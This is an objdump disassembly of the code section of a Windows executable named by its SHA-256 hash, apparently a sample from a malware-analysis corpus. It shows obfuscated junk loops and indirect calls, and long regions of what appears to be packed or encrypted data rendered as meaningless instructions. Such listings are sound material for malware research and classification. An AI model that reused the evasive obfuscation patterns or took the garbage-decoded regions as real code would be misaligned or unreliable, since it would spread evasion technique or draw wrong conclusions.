
10a1bb2df72d29a02deb7d09f00452f327192031c9493d8e81e39a57988c8788.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [esi],bl
  4011b8:	mov    BYTE PTR [esi+0x7e7e7ebe],ch
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [edx+0x0],edx
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x92c1b73a
  40126d:	mov    dh,0x94
  40126f:	xchg   edx,eax
  401270:	mov    ah,0xbd
  401272:	mov    edx,0x7fc53f47
  401277:	mov    eax,ds:0xe43c277
  40127c:	aas    
  40127d:	jge    0x4012e8
  40127f:	inc    edi
  401280:	ror    BYTE PTR [edx],0x9e
  401283:	adc    edi,DWORD PTR [ecx+eax*4]
  401286:	push   ds
  401287:	xchg   ebx,eax
  401288:	mov    edi,0xbbf49372
  40128d:	dec    esi
  40128e:	cmp    al,0xdb
  401290:	sbb    eax,0x8c80f8d
  401295:	jecxz  0x4012b7
  401297:	mov    ebp,0xc4e5695a
  40129c:	fsubp  st(2),st
  40129e:	jl     0x401255
  4012a0:	cmp    al,0xf8
  4012a2:	push   esi
  4012a3:	cwde   
  4012a4:	fld    TBYTE PTR [edi-0x2e]
  4012a7:	or     dh,ch
  4012a9:	mov    dh,0xda
  4012ab:	or     eax,0x74cc58eb
  4012b0:	mov    cl,0x4c
  4012b2:	adc    bh,dh
  4012b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b5:	pop    ebp
  4012b6:	push   ds
  4012b7:	fld    QWORD PTR [eax]
  4012b9:	and    DWORD PTR [eax],edi
  4012bb:	cli    
  4012bc:	dec    ecx
  4012bd:	addr16 mov ecx,0xf19354f6
  4012c3:	and    DWORD PTR [esi+eiz*2-0x5f],esi
  4012c7:	loope  0x40130f
  4012c9:	jne    0x40131c
  4012cb:	add    BYTE PTR [ebx+0x41],0x5b
  4012cf:	mov    dh,0xd5
  4012d1:	mov    eax,0xbd7b1236
  4012d6:	inc    ebp
  4012d7:	retf   0xae03
  4012da:	sub    BYTE PTR [esi],cl
  4012dc:	ja     0x401268
  4012de:	mov    DWORD PTR [eax-0x42],ecx
  4012e1:	test   BYTE PTR ds:0xc36fcf1f,al
  4012e7:	add    DWORD PTR [eax],esp
  4012e9:	mov    esp,0x611abb9e
  4012ee:	sub    DWORD PTR [esi+0x6d793c0a],esi
  4012f4:	mov    ah,0x88
  4012f6:	int    0xb9
  4012f8:	lods   al,BYTE PTR ds:[esi]
  4012f9:	push   0xd692a20b
  4012fe:	xor    eax,DWORD PTR [edi+edx*1+0x16388381]
  401305:	push   ebx
  401306:	das    
  401307:	add    al,0x1a
  401309:	jno    0x401319
  40130b:	push   ebp
  40130c:	pop    edx
  40130d:	or     cl,BYTE PTR [esi]
  40130f:	adc    DWORD PTR [edi+edi*1-0x4277f994],esi
  401316:	clc    
  401317:	cdq    
  401318:	mov    eax,ds:0x5375678b
  40131d:	xchg   ecx,eax
  40131e:	jmp    0x2fa3f4c9
  401323:	adc    eax,0x9faaa957
  401328:	xchg   ebx,eax
  401329:	mov    DWORD PTR [esi-0x3f],ebx
  40132c:	ror    ebx,1
  40132e:	adc    eax,0x1e1da76e
  401333:	(bad)  
  401334:	in     al,0x4
  401336:	(bad)  
  401338:	jns    0x40136f
  40133a:	rcr    BYTE PTR [ebx],cl
  40133c:	and    eax,0x4793a977
  401341:	clc    
  401342:	mov    bh,0x73
  401344:	push   ss
  401345:	jge    0x40130e
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	mov    edx,0xfaf7207f
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013da
  4013c0:	cmp    ah,BYTE PTR [ebx+0x3fbf30bd]
  4013c6:	cwde   
  4013c7:	imul   eax,ebp,0x4b2814f
  4013cd:	shl    BYTE PTR [eax],0x34
  4013d0:	mov    eax,ds:0x2a7d2f47
  4013d5:	mov    eax,ds:0x3c71d613
  4013da:	adc    bh,ah
  4013dc:	push   ecx
  4013dd:	and    bp,WORD PTR [edi]
  4013e0:	cmp    ch,dh
  4013e2:	enter  0x3597,0xb3
  4013e6:	mov    esp,0x5582efbc
  4013eb:	sbb    DWORD PTR [ebx],esi
  4013ed:	fs sahf 
  4013ef:	lea    edi,[ecx+ecx*4+0x231adb29]
  4013f6:	or     ebx,DWORD PTR [ecx+0xfada7dd]
  4013fc:	xchg   ecx,eax
  4013fd:	push   esi
  4013fe:	inc    ebp
  4013ff:	in     eax,dx
  401400:	fst    DWORD PTR [edi]
  401402:	push   es
  401403:	jmp    0xeae6:0x69c7d9c
  40140a:	jmp    0xbc0f1744
  40140f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401410:	call   0x9efe:0xe458c0cf
  401417:	inc    edi
  401418:	push   ss
  401419:	retf   0x88cd
  40141c:	or     ah,dl
  40141e:	jne    0x401453
  401420:	popa   
  401421:	fistp  DWORD PTR [edx-0x7c]
  401424:	cmp    ebp,eax
  401426:	daa    
  401427:	push   esp
  401428:	add    DWORD PTR [ecx+eax*2+0x17b4425a],eax
  40142f:	nop
  401430:	test   BYTE PTR [ebp-0x4c3451fe],bl
  401436:	ror    cl,1
  401438:	xor    eax,0x28eb77f4
  40143d:	inc    eax
  40143e:	mov    ds:0xe3a855c7,eax
  401443:	jg     0x4014a2
  401445:	push   ss
  401446:	cmp    BYTE PTR ds:0x7ec73135,bh
  40144c:	int    0x6b
  40144e:	xchg   esi,eax
  40144f:	repnz sbb BYTE PTR [ecx-0x6ec5f716],bh
  401456:	test   eax,0x89b741ed
  40145b:	out    dx,al
  40145c:	in     al,0x70
  40145e:	sub    al,0x19
  401460:	ret    
  401461:	push   es
  401462:	sbb    dl,cl
  401464:	cmp    eax,0x94a027cc
  401469:	cmp    al,0x33
  40146b:	push   cs
  40146c:	xlat   BYTE PTR ds:[ebx]
  40146d:	inc    esp
  40146e:	(bad)  
  40146f:	das    
  401470:	rcl    BYTE PTR [esi],0x5c
  401473:	and    eax,DWORD PTR [ecx+0x4c79e76f]
  401479:	pushf  
  40147a:	mov    ds:0x3af8dd36,al
  40147f:	movzx  esi,BYTE PTR [ebx-0x68]
  401483:	dec    edi
  401484:	sbb    DWORD PTR [ebp-0x3897cec],edi
  40148a:	cmp    BYTE PTR [ebp-0x67e7fece],bh
  401490:	mov    ah,bh
  401492:	mov    esp,0xa652463f
  401497:	sbb    BYTE PTR ds:0xf0140e5a,dl
  40149d:	inc    ecx
  40149e:	imul   edx,DWORD PTR [eax-0x13aa54d],0x2f
  4014a5:	lods   eax,DWORD PTR ds:[esi]
  4014a6:	cmp    bh,BYTE PTR [edx]
  4014a8:	aaa    
  4014a9:	aad    0x74
  4014ab:	pop    ebx
  4014ac:	pop    edx
  4014ad:	cli    
  4014ae:	(bad)  
  4014af:	push   cs
  4014b0:	jp     0x401497
  4014b2:	xlat   BYTE PTR ds:[ebx]
  4014b3:	mov    dh,0x91
  4014b5:	lds    esp,FWORD PTR [ecx-0x5a]
  4014b8:	sti    
  4014b9:	jmp    0x2f5e:0x86e2e3f9
  4014c0:	aas    
  4014c1:	retf   0x56a9
  4014c4:	jle    0x40148b
  4014c6:	xchg   edx,eax
  4014c7:	stos   DWORD PTR es:[edi],eax
  4014c8:	popf   
  4014c9:	in     eax,0x98
  4014cb:	xor    al,0x47
  4014cd:	pop    ds
  4014ce:	iret   
  4014cf:	xor    al,0x43
  4014d1:	loope  0x401501
  4014d3:	ds (bad) 
  4014d5:	test   eax,0x9de26833
  4014da:	mov    ah,0xdb
  4014dc:	repz dec esp
  4014de:	(bad)  
  4014e0:	add    al,0x0
  4014e2:	out    0x79,eax
  4014e4:	sub    al,0xa8
  4014e6:	sbb    bl,BYTE PTR ds:0xda718443
  4014ec:	sti    
  4014ed:	repz push esp
  4014ef:	push   es
  4014f0:	sbb    al,dh
  4014f2:	cmp    BYTE PTR [eax],dh
  4014f4:	xchg   ecx,eax
  4014f5:	mov    al,ds:0xf7cc2de6
  4014fa:	(bad)  
  4014fb:	jle    0x401567
  4014fd:	inc    eax
  4014fe:	sub    DWORD PTR [bx-0x1ae6],edi
  401503:	les    edx,FWORD PTR [eax+0x44d55d55]
  401509:	pop    esi
  40150a:	or     ecx,DWORD PTR [ebx+ecx*2+0x22e329db]
  401511:	jb     0x401569
  401513:	xchg   esp,eax
  401514:	jge    0x4014de
  401516:	shl    BYTE PTR [ebx+0x71],1
  401519:	ja     0x401532
  40151b:	adc    cl,ch
  40151d:	test   DWORD PTR [eax+eiz*8-0x2],ebp
  401521:	pushf  
  401522:	mov    esi,0x77c7b62a
  401527:	int    0x49
  401529:	shl    BYTE PTR [edi-0x6488c9a2],cl
  40152f:	mov    DWORD PTR [esi],0x41555be7
  401535:	lgs    eax,FWORD PTR [edx-0x38]
  401539:	xchg   esi,eax
  40153a:	add    DWORD PTR [eax+ebp*1+0x517ec277],eax
  401541:	loopne 0x40152a
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43370f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x64fe1f1d]
  401564:	sub    DWORD PTR [esi],eax
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015a4
  40156e:	out    0xbc,eax
  401570:	sub    al,0xda
  401572:	mov    esp,0x71aae7d6
  401577:	or     eax,0x255f67a4
  40157c:	jle    0x40154c
  40157e:	jb     0x401513
  401580:	ss inc ebx
  401582:	xchg   ecx,eax
  401583:	cwde   
  401584:	mov    al,0x2d
  401586:	fs sbb eax,0xed92e280
  40158c:	cmp    BYTE PTR [edx+0x1db5065b],0x79
  401593:	mov    bl,0xbb
  401595:	and    BYTE PTR [esi-0x15],cl
  401598:	call   0x9f17c45f
  40159d:	gs jmp 0xf8a00ccb
  4015a3:	inc    edi
  4015a4:	aas    
  4015a5:	test   al,0xb7
  4015a7:	dec    ebx
  4015a8:	fist   WORD PTR [ecx]
  4015aa:	out    0xf8,eax
  4015ac:	js     0x401548
  4015ae:	mov    ds:0x53b018be,eax
  4015b3:	hlt    
  4015b4:	pop    ss
  4015b5:	scas   al,BYTE PTR es:[edi]
  4015b6:	aam    0xbb
  4015b8:	(bad)  
  4015b9:	es jecxz 0x4015fa
  4015bc:	outs   dx,BYTE PTR ds:[esi]
  4015bd:	jle    0x40156c
  4015bf:	loopne 0x4015e3
  4015c1:	mov    dl,0x43
  4015c3:	sbb    esp,eax
  4015c5:	loop   0x4015e0
  4015c7:	push   ebx
  4015c8:	mov    al,ds:0xcc4a3f05
  4015cd:	mov    eax,ds:0x1ba8b816
  4015d2:	mov    dl,0x47
  4015d4:	ret    0xbd15
  4015d7:	pop    esp
  4015d8:	retf   0xc7a7
  4015db:	dec    ebp
  4015dc:	daa    
  4015dd:	loopne 0x401646
  4015df:	xchg   DWORD PTR [ebp+0x720ccb0d],ecx
  4015e5:	pop    ecx
  4015e6:	mov    ah,0x55
  4015e8:	xchg   ebx,eax
  4015e9:	push   ecx
  4015ea:	ret    
  4015eb:	jg     0x401652
  4015ed:	ja     0x40165a
  4015ef:	fmulp  st(7),st
  4015f1:	dec    ebp
  4015f2:	or     eax,0x4ef1f18f
  4015f7:	lods   eax,DWORD PTR ds:[esi]
  4015f8:	cmp    DWORD PTR [ecx+0x65],0xc86a85d0
  4015ff:	sub    DWORD PTR [ecx],esi
  401601:	pop    esp
  401602:	sbb    ah,BYTE PTR [edi-0x48]
  401605:	ficom  DWORD PTR [esi]
  401607:	getsec 
  401609:	enter  0xa0cc,0xa5
  40160d:	fwait
  40160e:	loop   0x401610
  401610:	stos   DWORD PTR es:[edi],eax
  401611:	jno    0x401682
  401613:	lods   al,BYTE PTR ds:[esi]
  401614:	shl    bl,1
  401616:	int3   
  401617:	pop    eax
  401618:	inc    eax
  401619:	cmp    ch,ah
  40161b:	pop    ss
  40161c:	sbb    dh,al
  40161e:	je     0x401635
  401620:	(bad)  
  401621:	out    dx,al
  401622:	repz push edi
  401624:	adc    DWORD PTR [esi+edx*1-0x50],esp
  401628:	outs   dx,BYTE PTR ds:[esi]
  401629:	or     al,0xe9
  40162b:	push   ss
  40162c:	lea    edi,[edx-0x76]
  40162f:	test   al,0xd6
  401631:	mov    edx,0x3c12e9df
  401636:	nop
  401637:	bnd jg 0x401630
  40163a:	sti    
  40163b:	xchg   ecx,eax
  40163c:	mov    edi,0x2a376f26
  401641:	mov    DWORD PTR [ebx],0x977b599
  401647:	pop    ecx
  401648:	push   eax
  401649:	inc    eax
  40164a:	mov    bh,0xf5
  40164c:	es (bad) 
  40164e:	iret   
  40164f:	sbb    BYTE PTR [edx],al
  401651:	shl    BYTE PTR [esi+0xb],0x26
  401655:	add    DWORD PTR [edi+0x16],ecx
  401658:	dec    edi
  401659:	add    al,0x38
  40165b:	and    ebx,DWORD PTR [edi]
  40165d:	jne    0x4016d2
  40165f:	neg    ch
  401661:	enter  0x4f94,0x64
  401665:	dec    eax
  401666:	das    
  401667:	cld    
  401668:	fdivr  DWORD PTR [edi+0x21]
  40166b:	jg     0x401690
  40166d:	stos   BYTE PTR es:[edi],al
  40166e:	jp     0x401682
  401670:	cli    
  401671:	inc    eax
  401672:	retf   
  401673:	pop    esi
  401674:	dec    esp
  401675:	mov    ah,0x12
  401677:	add    eax,0xc1962cd0
  40167c:	sbb    DWORD PTR [ebx-0x601e632e],ebp
  401682:	gs fneni(8087 only) 
  401685:	inc    edi
  401686:	inc    ebx
  401687:	in     eax,dx
  401688:	nop
  401689:	cmp    DWORD PTR [ecx-0x62df848a],0xffffffd7
  401690:	mov    ebx,0xc7ee4a27
  401695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401696:	mov    BYTE PTR [edi],0x73
  401699:	das    
  40169a:	ffree  st(1)
  40169c:	pop    ds
  40169d:	push   edx
  40169e:	xor    DWORD PTR [esi-0x5896a4b3],0xffffffc2
  4016a5:	jnp    0x401686
  4016a7:	cmp    eax,0x8f34ad65
  4016ac:	cmp    edx,ecx
  4016ae:	cmp    al,0x47
  4016b0:	cmp    DWORD PTR [eax+0x5afb6c22],eax
  4016b6:	xor    ah,BYTE PTR [esi-0x13]
  4016b9:	dec    ebp
  4016ba:	mov    ebx,0xc70ea965
  4016bf:	pop    edx
  4016c0:	and    DWORD PTR [edi+0x53ca1f94],0x5e
  4016c7:	pop    ds
  4016c8:	jne    0x401740
  4016ca:	mov    cl,0xc1
  4016cc:	call   0x9d66:0x20b8740d
  4016d3:	jp     0x401683
  4016d5:	inc    esi
  4016d6:	sbb    DWORD PTR [ebx],ebx
  4016d8:	or     BYTE PTR ds:0xf7abfa08,al
  4016de:	mov    BYTE PTR [esp+edx*8+0x4c80a2],al
  4016e5:	mov    eax,0xcf352d3d
  4016ea:	pop    ebx
  4016eb:	sbb    BYTE PTR [ebx+0x5a],cl
  4016ee:	hlt    
  4016ef:	sub    esi,edi
  4016f1:	add    eax,edi
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xe0496ade
  4018e9:	push   0x7e7a8244
  4018ee:	jle    0x4018ea
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018f5
  4018f4:	inc    esi
  4018f5:	mov    ecx,0xee98b989
  4018fa:	mov    dh,0xff
  4018fc:	dec    ebp
  4018fd:	pusha  
  4018fe:	xor    esi,edi
  401900:	sbb    BYTE PTR [esi-0x2ef5e7c8],0x85
  401907:	inc    edi
  401908:	cmp    ah,bh
  40190a:	ja     0x401905
  40190c:	mov    bl,0x94
  40190e:	xchg   ecx,eax
  40190f:	mov    ch,0x55
  401911:	into   
  401912:	data16 div BYTE PTR [eax-0x54]
  401916:	push   ss
  401917:	ror    BYTE PTR [edx+0x7c],1
  40191a:	cli    
  40191b:	lods   eax,DWORD PTR ds:[esi]
  40191c:	cmp    edi,DWORD PTR [ebx]
  40191e:	xchg   BYTE PTR [eax-0x37],dl
  401921:	repnz ss (bad) 
  401925:	mov    al,ds:0x948e15c
  40192a:	xor    bh,BYTE PTR [ebp+0x7c]
  40192d:	and    BYTE PTR [eax+0x30],0xc5
  401931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401932:	inc    eax
  401933:	sub    BYTE PTR [edx+edx*2+0x3a],al
  401937:	adc    al,0xe8
  401939:	cld    
  40193a:	inc    ecx
  40193b:	in     al,0x81
  40193d:	mov    bl,0x67
  40193f:	sbb    ecx,ecx
  401941:	cmp    ch,BYTE PTR [edx+0xbba6590]
  401947:	lock push eax
  401949:	push   edi
  40194a:	jnp    0x4018fb
  40194c:	call   0x9ec3:0x88808e0c
  401953:	nop
  401954:	jp     0x4019d4
  401956:	push   edx
  401957:	cld    
  401958:	mov    dl,0xb
  40195a:	ret    0x4385
  40195d:	mov    esi,0x83d61db5
  401962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401964:	fbld   TBYTE PTR [ebx]
  401966:	sbb    edx,DWORD PTR [esp+eax*1]
  401969:	xchg   ebp,eax
  40196a:	ja     0x40192f
  40196c:	adc    edx,edi
  40196e:	sub    BYTE PTR [ebx],0x77
  401971:	jl     0x40199d
  401973:	pop    esp
  401974:	inc    ebp
  401975:	xor    esp,DWORD PTR [esi-0x2ba62143]
  40197b:	mov    ah,0xf8
  40197d:	sbb    eax,0x1278b7fd
  401982:	mov    cl,0xc4
  401984:	data16 aaa 
  401986:	out    0xa3,al
  401988:	int    0x74
  40198a:	sbb    al,BYTE PTR [ebx+eiz*8]
  40198d:	adc    al,BYTE PTR [eax]
  40198f:	scas   al,BYTE PTR es:[edi]
  401990:	rcr    dh,cl
  401992:	push   ebx
  401993:	test   al,0x7a
  401995:	sbb    dh,BYTE PTR [edx+ebx*8]
  401998:	lahf   
  401999:	push   eax
  40199a:	push   cs
  40199b:	mov    eax,ds:0x458625a6
  4019a0:	pop    esp
